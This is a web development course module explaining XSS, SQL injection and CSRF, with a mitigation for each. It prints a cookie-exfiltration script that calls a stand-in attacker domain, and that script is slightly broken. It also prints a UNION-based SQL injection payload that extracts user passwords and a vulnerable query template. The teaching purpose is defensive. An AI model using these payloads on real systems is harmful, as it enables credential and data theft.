# 4.4: Security

## Learning Objectives

1. The most vulnerable security loopholes are usually human ones such as phishing or insecure storage of passwords
2. If we follow best practices for building apps, generally our apps should be technically secure
3. Know how well-known attacks such as XSS, CSRF and SQL injection work

## Introduction

Data breaches more commonly exploit human behaviour than technical loopholes, using techniques such as phishing to retrieved credentials from privileged users. This is why cybersecurity is more often about mandating phishing training, multi-factor authentication and minimal access privileges across organisations than technical security of applications.

If we follow best practices for building apps as we have so far, our apps should be technically secure. When we deviate from standard libraries and configure authentication, database access, cloud access privileges manually, that is when security considerations become more relevant. Teams that manage sensitive data should conduct regular audits to ensure technical application security.

In this submodule we will learn about 3 well-known types of technical attacks on web applications, so common they are listed in the [OWASP Top 10](https://owasp.org/www-project-top-ten/), a publicly-maintained list of the 10 most common web application security risks. These are Cross-Site Scripting (XSS), SQL Injection and Cross-Site Request Forgery.

## Cross-Site Scripting (XSS)

### Introduction

Cross-site scripting (aka XSS) is a type of injection attack where an attacker saves JavaScript in a system to be executed later. When executed, that JavaScript might send a request with the logged-in user's credentials to a different server, or perform an unauthorised transaction on the current server.

### Part 1: Save JavaScript to database

#### Exploit

The first part of an XSS attack is saving JavaScript to the database. We can do this by entering JavaScript into an non-sanitised form field, such as the following.

```javascript
<script>alert("Hey!")</script>
```

#### Mitigation: Validate user input

Always validate user input before saving to database. Validation logic is complicated, but luckily others have implemented convenient libraries for us and those libraries are publicly maintained. One of the most popular validation libraries is [`xss`](https://www.npmjs.com/package/xss).

### Part 2: Execute non-sanitised user input

#### Exploit

Once the app has saved our script to the database, the app should run our script every time the app retrieves that data and renders it in the frontend.

We can now make the app execute arbitrary JavaScript and alter our JavaScript to steal other users' credentials. One such exploit would be to send the logged-in user's cookies to our own server. Below is an example of such a script that creates an `img` HTML element whose `src` attribute is our URL with all cookies attached.

```html
<script>
  const allCookies = document.cookie;
  document.createElement('img'); 
  imgEl.src = 'http://my-bad-domain.com?' + allCookies;
</script>
```

#### Mitigation: Sanitise database values before executing

Most modern view libraries including React will automatically sanitise values before rendering them in HTML to prevent XSS attacks. To prevent this exploit, use a standard library such as React for rendering views, and if we cannot, find a [library to escape values](https://github.com/component/escape-html) before rendering those values in HTML.

[Here is React's documentation](https://reactjs.org/docs/introducing-jsx.html#jsx-prevents-injection-attacks) on how it sanitises input before rendering it in JSX.

## SQL Injection

### Introduction

SQL injection is a type of injection attack where the attacker injects malicious SQL into user input that is subsequently executed on the database. This is commonly used to steal or corrupt data.

### Exploit: Clever SQL Syntax

Imagine the following Express logic that generates a SQL query.

```javascript
const query = `SELECT name, type FROM cats WHERE name='${request.params.name}'`
```

Now imagine instead of a valid name, we input the following to the app.

```sql
kai' UNION SELECT email, password FROM users--
```

This would generate the following SQL query, which would return all user emails and passwords.

```sql
SELECT name, type FROM cats WHERE name='kai' UNION SELECT email, password FROM users--'
```

The above example is from [Portswigger](https://portswigger.net/web-security/sql-injection), a well-known web security blog. `UNION` syntax let's us execute an additional SQL query and append results to the original.

### Mitigation: Always parameterise SQL queries

Our app is vulnerable to SQL injection because we use raw user input in our SQL query.

To prevent this, most SQL libraries such as `pg` allow us to provide user input as parameters separate from the SQL query, such that the library can sanitise that input before constructing the query. ORM libraries like Sequelize automatically sanitise input when constructing SQL queries.

## Cross-Site Request Forgery (CSRF)

### Introduction

Cross-Site Request Forgery (aka CSRF) is an attack where an attacker sends a forged request to a legitimate server to perform functionality on behalf of a user. This forged request is commonly generated by phishing, for example making the user click a link that triggers the attack functionality. This can be used to compromise user accounts by changing passwords, for example.

### Exploit Part 1: Make user click on link

If we suspect a user's browser may be storing authentication credentials, we can use phishing techniques to make that user click on a link that either changes those credentials to something we know (e.g. change password) or perform other functionality (e.g. transfer money). This link can be masked with text (e.g. "unsubscribe here") or a call to action button (e.g. "Learn More").

### Exploit Part 2: Legitimate server does not check for CSRF

As an example, if an API server's password reset route were a GET route and user credentials were stored in the browser from a previous login, attackers could craft a link to set new password credentials in the request URL while sending login credentials via cookies with the request. This is why we should always use POST or PUT requests for altering data on our servers.

### Mitigation: CSRF token and token verification

To prevent CSRF, we can protect sensitive routes that should only be accessed by specific forms (and not wild links) with cryptographic tokens called CSRF tokens. These tokens would be generated by the backend, passed to the frontend on form load and validated by the backend on form submission. This guarantees that users can only submit valid form submissions from the frontend app and nowhere else.

[`csurf`](http://expressjs.com/en/resources/middleware/csurf.html) is the most popular CSRF token library for Express.
